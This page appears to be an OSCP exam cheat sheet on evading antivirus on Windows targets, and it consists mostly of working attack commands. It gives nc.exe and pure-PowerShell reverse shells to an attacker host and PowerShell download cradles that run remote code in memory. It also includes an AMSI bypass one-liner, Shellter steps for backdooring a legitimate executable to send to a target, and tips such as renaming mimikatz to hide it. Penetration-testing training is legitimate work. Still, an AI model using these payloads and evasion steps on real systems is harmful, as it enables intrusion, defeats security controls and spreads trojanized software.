---
title: "AV Evasion"
date: 2026-06-20
weight: 150
draft: false
summary: "Collection of antivirus evasion techniques for when Defender blocks your payload."
---

Techniques for evading antivirus on OSCP targets. Rarely needed, but they save you when Defender blocks a payload.

- Source: https://heretek.dev/oscp-cheatsheet/av-evasion/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP (`ATTACKER` in the examples means the same Kali IP)

- Exam rules: Custom scripts and manual bypasses are allowed. Commercial tools (Cobalt Strike, etc.) are prohibited.

## Quick Decision Tree

```text
Payload blocked by AV?
  │
  ├── Try nc.exe first (rarely flagged)
  │     C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe
  │
  ├── Try PowerShell in-memory (no file on disk)
  │     powershell -e <BASE64_PAYLOAD>
  │     IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
  │
  ├── Try Shellter (inject into legit PE)
  │     shellter → Auto → select legit .exe → inject meterpreter
  │
  └── Try manual obfuscation (rename, recompile, modify strings)
```

## Technique 1 — Use nc.exe (simplest, try first)

nc.exe is a legitimate networking tool, so AV rarely flags it.

```bash
# Host it from Kali
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80

# Download to target
certutil -urlcache -f http://ATTACKER/nc.exe C:\Windows\Temp\nc.exe

# Execute
C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe
```

## Technique 2 — PowerShell in-memory execution (no file on disk)

The AV file engine cannot detect what never touches disk. A PowerShell download cradle executes directly in memory.

```powershell
# Download and execute script in memory (nothing written to disk)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')

# Base64 encoded payload (no quoting issues, harder to signature-match)
powershell -nop -w hidden -e <BASE64_PAYLOAD>
```

Generate a base64 payload:

```bash
# On Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f psh -o shell.ps1
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
# Copy the output, use with: powershell -e <PASTE>
```

### PowerShell AMSI bypass (when PowerShell itself is blocked)

AMSI (Antimalware Scan Interface) inspects PowerShell commands before execution. Bypass:

```powershell
# Simple AMSI bypass (may be patched — try variations)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

## Technique 3 — Shellter (inject payload into a legit PE)

Shellter injects shellcode into a legitimate Windows executable while keeping its original functionality.

```bash
# Install on Kali
sudo apt install shellter wine

# ARM64 Kali (Apple Silicon):
sudo dpkg --add-architecture amd64
sudo apt install -y qemu-user-static binfmt-support
sudo apt install wine32

# Run
shellter
```

Procedure:

1. Choose `A` (Auto mode)
2. Specify a legitimate 32-bit Windows .exe (download any installer)
3. Enable Stealth Mode (restores the original exe behavior after the payload runs)
4. Select payload: `L` (listed) → `1` (Meterpreter reverse TCP)
5. Set LHOST and LPORT
6. Send the backdoored exe to the target

```bash
# Set up listener for Meterpreter
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST ATTACKER;set LPORT 443;run;"
```

- Note: Shellter supports 32-bit PE only. Get the carrier as a 32-bit installer.
- Note: Do not upload to VirusTotal — samples are shared with every AV vendor.

## Technique 4 — Manual obfuscation

When a prebuilt payload gets caught:

```bash
# Recompile exploit from source (different compiler = different hash)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

# Change strings in the binary
sed -i 's/metasploit/legitimate/g' exploit.c

# UPX packing (changes hash, may bypass simple signature checks)
upx --best exploit.exe -o packed.exe

# Rename known-flagged tools
cp mimikatz.exe notepad_helper.exe
```

## Technique 5 — Living Off the Land (no external tools)

Use tools already present on the target, which AV does not flag:

```powershell
# PowerShell reverse shell (no external binary needed)
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# certutil for file transfer (built-in, rarely blocked)
certutil -urlcache -f http://ATTACKER/file C:\Windows\Temp\file

# bitsadmin alternative
bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\Windows\Temp\file
```

## When AV is not the problem

Most OSCP targets have AV disabled or minimized. If the payload fails:

- Check the architecture (32 vs 64 bit)
- Check the firewall (try 80/443 instead of 4444)
- Verify the payload locally first
- Use nc.exe — it almost always works

The exam is about methodology, not AV evasion. Do not spend hours on a bypass when nc.exe would solve it.
